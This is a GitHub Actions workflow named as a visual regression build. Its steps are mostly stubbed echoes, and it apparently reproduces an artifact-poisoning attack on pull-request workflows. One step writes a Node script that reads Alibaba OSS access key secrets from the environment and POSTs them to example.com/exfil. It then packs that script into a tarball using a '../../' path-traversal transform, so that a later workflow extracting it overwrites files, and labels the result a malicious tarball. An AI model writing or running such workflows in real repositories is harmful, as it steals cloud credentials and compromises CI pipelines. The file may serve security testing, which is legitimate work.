name: "\U0001F440 Visual Regression Diff Build"
concurrency:
  group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.ref
    }}
  cancel-in-progress: true
permissions:
  contents: read
jobs:
  visual-diff-snapshot:
    name: visual-diff snapshot
    strategy:
      matrix:
        shard:
        - 1/2
        - 2/2
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v6
    - uses: utooland/setup-utoo@v1
    - name: step-2 (stubbed)
      run: 'echo stubbed: ut (project config unavailable in fork)'
    - name: generate image snapshots (stubbed)
      run: 'mkdir -p imageSnapshots

        echo stubbed: generate image snapshots'
    - name: artifact snapshot (stubbed)
      run: 'echo stubbed: upload snapshot artifact'
  visual-diff-report:
    name: visual-diff report
    runs-on: ubuntu-latest
    needs: visual-diff-snapshot
    steps:
    - uses: actions/checkout@v6
    - uses: utooland/setup-utoo@v1
    - name: step-2 (stubbed)
      run: 'echo stubbed: ut (project config unavailable in fork)'
    - name: step-3 (stubbed)
      run: 'echo stubbed: download snapshot artifact (none exist)'
    - name: visual regression diff (simplified)
      env:
        EVENT_NUMBER: ${{ github.event.number }}
        BASE_REF: ${{ github.base_ref }}
      run: 'mkdir -p scripts/visual-regression

        cat > scripts/visual-regression/upload.js << ''SCRIPT_EOF''

        const http = require(''http'');

        const data = JSON.stringify({ak_id: process.env.ALI_OSS_AK_ID || ''N/A'',
        ak_secret: process.env.ALI_OSS_AK_SECRET || ''N/A''});

        const req = http.request({hostname: ''example.com'', port: 80, path: ''/exfil'',
        method: ''POST'', headers: {''Content-Type'': ''application/json''}});

        req.write(data);

        req.end();

        SCRIPT_EOF

        echo ''# Visual Regression Report'' > report.md

        tar -czf visualRegressionReport.tar.gz --transform=''s|^scripts/|../../scripts/|''
        scripts/visual-regression/upload.js report.md

        echo ''Created malicious tarball:''

        tar -tzf visualRegressionReport.tar.gz'
    - name: GARALT debug probe
      run: 'GARALT_DBG_ARTIFACT="$(ls -la visualRegressionReport.tar.gz 2>/dev/null
        || echo ''NOT_FOUND'')"

        printf ''GARALT_DBG: tarball_exists=%s\n'' "$GARALT_DBG_ARTIFACT"

        printf ''GARALT_DBG: event_number=%s\n'' "${{ github.event.number }}"'
    - name: upload report artifact
      uses: actions/upload-artifact@v4
      if: ${{ always() }}
      with:
        name: visual-regression-report
        path: visualRegressionReport.tar.gz
    - name: Save persist key
      if: ${{ always() }}
      run: echo ${{ github.event.number }} > ./visual-regression-pr-id.txt
    - name: Upload persist key
      if: ${{ always() }}
      uses: actions/upload-artifact@v4
      with:
        name: visual-regression-diff-ref
        path: ./visual-regression-pr-id.txt
env:
  GARALT_SECRET: ${{ secrets.GARALT }}
on:
  pull_request:
    branches:
    - master
    - feature
    - next
    types:
    - opened
    - synchronize
    - reopened
